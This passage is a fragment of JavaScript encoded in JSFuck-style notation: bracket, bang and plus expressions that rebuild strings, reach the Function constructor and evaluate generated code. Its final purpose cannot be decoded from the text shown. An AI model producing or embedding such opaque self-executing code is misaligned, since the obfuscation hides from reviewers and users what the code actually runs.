[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(+!![]+[])+(+[]+[])+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[+[]]+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+([][[]]+[])[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]])+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]